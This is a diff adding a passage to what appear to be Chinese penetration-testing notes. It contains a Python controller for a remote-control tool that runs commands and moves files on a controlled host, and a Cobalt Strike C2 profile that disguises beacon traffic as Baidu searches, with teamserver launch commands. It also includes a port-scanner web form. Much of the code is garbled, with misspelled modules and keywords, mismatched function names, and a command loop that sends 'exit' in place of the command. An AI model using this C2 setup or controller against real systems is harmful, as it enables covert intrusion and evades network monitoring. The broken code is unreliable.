@@ -4387,6 +4387,241 @@ if __name__ == '__main__':
         while True:
             print("Functional selection:\n")
             print("[1]ExecCommand \n[2]TransferFiles\n")
+            choice = input('[None]>>> ')
+            #给被控端发送指令，主控端进入相应的功能模块
+            if choice == '1':
+                # 发送的命令为str型，需要用encode函数把命令转换为bytes型
+                conn.sendall('1'.encode())
+                ExecCommand(conn, addr)
+            elif choice == '2':
+                conn.sendall('2'.encode())
+                TransferFiles(conn, addr)
+            elif choice == 'exit':
+                conn.sendall('exit'.encode())
+                serverSocket.close()
+                break
+    except:
+        serverSocket.close()
+
+def ExecCommand(conn, addr):
+    while True:
+        command = input("[ExecCommand]>>> ")
+        if command == 'exit':
+            #主控端退出相应模块时，也要通知客户端退出对应的功能模块
+            conn.sendall('exit'.encode())
+            break
+        conn.sendall('exit'.encode())
+        result = conn.recv(10000).decode()
+        print(result)
+
+def TransferFiles(conn, addr):
+    print("Usage: method filepath")
+    print("Example: upload /root/xxx | download /root/xxx")
+    while True:
+        command = input("[TransferFiles]>>> ")
+        commandList = command.split()
+        if commandList[0] == 'exit':
+            #主控端退出相应模块时，也要通知被控制端退出对应的功能模块
+            conn.sendall('exit'.encode())
+            break
+        # 若方法为downlaod,则表示主控端需要获取被控端的文件
+        if commandList[0] == 'download':
+            DownlaodFile(conn, addr, command)
+        if commandList[0] == 'upload':
+            UploadFile(conn, addr, command)
+
+def UploadFile(conn, addr,command):
+    #把主控端的命令发送给被控端
+    conn.sendall(command.encode())
+    commandList = command.split()
+    while True:
+        uploadFilePath = commandList[1]
+        if ps.path.isfile(uploadFilePath):
+            fileInfo = struct.pack('128sl', bytes(os.path.basename(uploadFilePath).encode('utf-8')), ps.stat(uplaodFilePath).st_size)
+            conn.sendall(fileInfo)
+            print('[+]FileInfo send success! name: {0}     size:{1}'.format(os.path.basename(uploadFilePath), os.stat(uploadFilePath).st_size)
+            print('[+]start uploading...')
+            with open(iploadFilePath, 'rb') as f:
+                while True:
+                    data = f.read(1024)
+                    if not data:
+                        print("File Send Over!")
+                        break
+                    conn.sendall(data)
+                break
+
+def DownloadFile(conn, addr, command):
+    conn.sendall(commamd.encode())
+    while True:
+        fileInfo = conn.recv(struck.calcsize('128sl'))
+        if fileInfo:
+            fileName, fileSize = struck.unpack('128sl', fileInfo)
+            fileName = fileName.decode().strip('\00')
+            newFilename = os.path.join('./', fileName)
+            print('Fileinfo Receive over! name: {0}   size:{1}'.format(filename, fileSize))
+
+            recvdSize = 0
+            print('start receiving...')
+            whit open(newFilename, 'wb') as f:
+                while not recvdSize == fileSize:
+                    if fileSize - recvdSize > 1024:
+                        data = conn.recv(1024)
+                        f.write(data)
+                        recvdSize += len(data)
+                    else:
+                        data = conn.recv(fileSize - recvdSize)
+                        f.write(data)
+                        recvdSize = fileSize
+                        break
+        print("File Receive over!!!")
+    braek
+```
+
+</details>
+
+<details>
+<summary>Cobalt Strike_默认端口为50050</summary>
+
+```
+# C2 通信配置文件_baidu.profile
+# 通过修改beacon特征，伪装流量，单一团队服务器只能加载一个profile,抓包查看Cobalt Strike的默认通信特征
+
+set sample_name "Baidu Profile";
+
+set sleeptime "1000";
+
+set jitter "17"; #设置随机抖动时间
+
+set useragent "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://wwww.baidu.com/search/spider.html)";
+
+#设置beacon http请求事件
+
+#使用GET方式模拟百度搜索
+http-get {
+set uri "/s/ie=utf-8&newi=1&mod=11&sbd=1_";
+server {
+header "Server" "BWS/1.0";
+header "Set-Cookie" "delPer=0; path=/; domain=.baidu.com"; header "Cache-Control" "private";
+header "Connection" "keep=alive";
+header "Content-Encoding" "gzip";
+header "Content-Type" "text/html;charet=utf-8";
+header "Vary" "Accept-Encoding";
+output {
+prepend "<div><div id=\"__status\">-12</div><div id=\"__redirect\">0</div><div id=\"__switchtime\">0</div><div id=\"__querySign\">e95d0ebc1edd32aa</div><script id=\"__sugPreInfo\">{\"prefix\":\ss\",\"presearch\":\"0\",\"query\": \"ss\", \"sug\":\"\", \"ps\":\"0.000611\",\"ss\":\"0.000000\",\"debug\ ":\"0232\", \"wd\":";
+append "}</script></div>";
+print;
+}
+}
+ client {
+header "Accept" "*/*";
+header "Accept-Language" "en,zh-CN;q=0.9, zh; q=0.8"; header "Host" "www.baidu.com";
+header "s_referer" "https://www.baidu.com/";
+metadata {
+mask;
+base64url;
+parameter "isid";
+}
+} )
+
+#使用POST的方式模拟百度搜索
+http-port {
+set uri "/s/ie=utf-8&newi=1&mod=11&isbd=1";
+server {
+header "Server" "BWS/1.0";
+header "Set-Cookie" "delPer=0; path=/; domain=.baidu.com"; header = "Cache-Control" "private";
+header "Connection" "keep-alive";
+header "Content-Encoding" "gzip";
+header "Content-Type" "text/html;charet=utf-8";
+header "Vary" "Accept-Encoding";
+output {
+prepend "<div><div id=\"__status\">-12</div><div id=\"__redirect\">0</div><div id=\"__switchtime\">0</div><div id=\"__querySign\">e95d0ebc1edd32aa</div><script id=\"__sugPreInfo\">{\"prefix\":\ss\",\"presearch\":\"0\",\"query\": \"ss\", \"sug\":\"\", \"ps\":\"0.000611\",\"ss\":\"0.000000\",\"debug\ ":\"0232\", \"wd\":";
+append "}</script></div>";
+print;
+}
+}
+ client {
+header "Accept" "*/*";
+header "Accept-Language" "en,zh-CN;q=0.9, zh; q=0.8"; header "Host" "www.baidu.com";
+header "s_referer" "https://www.baidu.com/";
+id {
+parameter "isid";
+}
+output {
+mask;
+base64url;
+print;
+} }
+}
+
+#最后使用c2lint检查C2配置
+#$ ./c2lint baidu.profile
+#$ sudo ./teamserver 172.20.10.10 test baidu.profile
+#加载完成后反弹一个shell
+#使用Wireshark抓取数据包，查看通过C2配置文件后的流量情况
+```
+
+</details>
+
+<details>
+<summary>端口扫描脚本的Web模版</summary>
+
+```
+<div class="layui-body" id="pocTest" style="padding: 15px;">
+    <div class="layui-row">
+        <div class="layui-col-md4">
+            <div class="grid-demo grid-demo-bg1">&nbsp;</div>
+        </div>
+        <div class="layui-col-md4">
+            <div class="grid-demo grid-demo-bg1">
+                <br/>
+                <br/>
+                <br/>
+                <br/>
+                <div class="h1 col-md-offset-4"><b>端口扫描</b></div>
+                <br/>
+                <hr>
+                <form method="port" role="form" action="" name="scriptform" targer="_blank">
+                    {% csrf_token %}
+                    <!-- sriptID这个元素一定要有，用来让后台识别调用哪个脚本 -->
+                    <div class="form-group" hidden>
+                        <label for="scriptID">脚本名称</label>
+                        <input type="text" class="form-control" id="scriptID" nam'scriptID' placeholde"脚本ID“ valu"{{ script_id }}">
+                    </div>
+                    <!-- 下面按需增加元素 -->
+                    <div class="form-group">
+                        <label for="num1">目标IP</label>
+                        <input type="text" class="form-control" id="num1" name='-i' placeholder="目标的IP地址 ">
+                    </div>
+                    <div class="form-group">
+                        <label for="num2">扫描的端口</label>
+                        <input type="text" class="form-control" id="num2" name="=p" placeholder="可以指定单个端22，也可以指定端口范围1-8080">
+                    </div>
+                    <div class="form-group">
+                        <label for="num2">线程数</label>
+                        <input type"text" class="form-control" id="num2" name="-t" placeholder="线程数">
+                    </div>
+                    <button class="btn btn=success col-md-offset-2 btn-lg" onclic"submissions()"><b>提 交</b></button>
+                    <button class="btn btn-danger col-md-offset-2 btn-lg" onclick="asytasks()"><b>加入任务队列</b></button>
+                </form>
+            </div>
+        </div>
+        <div class="layui-col-md4">
+            <div class="grid-demo grid-demo-bg1">&nbsp;</div>
+        </div>
+    </div>
+</div>
+<script>
+    //点“提交”时响应，后台直接处理返回结果。适合需要立即响应结果且花费时间少的任务
+    function submissions() {
+        document.scriptform.action = "{% url 'scriptCall' %}";
+        document.scriptform.submit();
+    }
+    //点"加入任务队列"时响应，加入后台异步任务队列。适合花费时间长的任务
+    fuction asytasks() {
+        document.scriptform.action = "{% url 'tasksQueue' %}";
+        document.scriptform.submit();
+    }
+</script>
 ```
 
 </details>
